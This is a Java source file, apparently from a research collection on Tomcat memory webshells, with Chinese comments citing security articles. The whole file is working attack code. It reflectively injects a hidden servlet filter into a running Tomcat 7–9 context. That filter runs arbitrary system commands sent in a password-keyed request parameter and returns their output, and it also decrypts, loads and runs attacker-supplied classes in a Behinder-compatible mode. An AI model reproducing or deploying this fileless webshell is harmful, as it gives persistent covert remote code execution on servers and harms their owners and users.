package com.memshell.tomcat;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Scanner;
import java.util.UUID;

public class FilterBasedBasic extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        参考：
//        《Tomcat源代码调试：看不见的Shell第一式》    https://www.freebuf.com/articles/web/151431.html
//        《基于tomcat的内存 Webshell 无文件攻击技术》    https://xz.aliyun.com/t/7388
//        《动态注册之Servlet+Filter+Listener》    https://www.jianshu.com/p/cbe1c3174d41
//        《基于Tomcat无文件Webshell研究》   https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA
//        《tomcat不出网回显连续剧第六集》   https://xz.aliyun.com/t/7535
//        《tomcat结合shiro无文件webshell的技术研究以及检测方法》     https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg
//
//        适用范围: Tomcat 7 ~ 9

        try{

            String filterName = "dynamic1";
            String urlPattern = "/aaa";
            final String password = "pass";

            // 获取 standardContext
            final ServletContext servletContext = req.getSession().getServletContext();

            Field field = servletContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

            field = applicationContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            StandardContext standardContext = (StandardContext) field.get(applicationContext);

            field = standardContext.getClass().getDeclaredField("filterConfigs");
            field.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

            if(map.get(filterName) == null){
                System.out.println("[+] Add Dynamic Filter");

                //生成 FilterDef
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterDefClass = null;
                try{
                    filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                }catch(ClassNotFoundException e){
                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                }

                Object filterDef = filterDefClass.newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
                Filter filter = new Filter() {
                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        System.out.println("[+] Dynamic Filter says hello");

                        String type = servletRequest.getParameter("type");
                        if(type != null && type.equals("basic")){
                            String cmd = servletRequest.getParameter(password);
                            if(cmd != null && !cmd.isEmpty()){
                                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                                servletResponse.getWriter().println(result);
                            }
                        }else if(type != null && type.equals("behinder")){
                            try{
                                if(servletRequest.getParameter(password)!=null){
                                    String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
                                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", key);
                                    servletResponse.getWriter().print(key);
                                    return;
                                }

                                Cipher cipher = Cipher.getInstance("AES");
                                cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                                byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
                                Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                                Object evilObject = evilClass.newInstance();
                                Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                                targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
                            }catch(Exception e){
                                e.printStackTrace();
                            }
                        }else{
                            filterChain.doFilter(servletRequest, servletResponse);
                        }
                    }

                    @Override
                    public void destroy() {

                    }

                    class U extends ClassLoader{
                        U(ClassLoader c){super(c);}

                        public Class g(byte []b){return super.defineClass(b,0,b.length);}
                    }
                };


                filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
                filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
                standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});

                //设置 FilterMap
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterMapClass = null;
                try{
                    filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                }catch (ClassNotFoundException e){
                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                }

                Object filterMap = filterMapClass.newInstance();
                filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
                //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

                //设置 FilterConfig
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                map.put(filterName, filterConfig);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}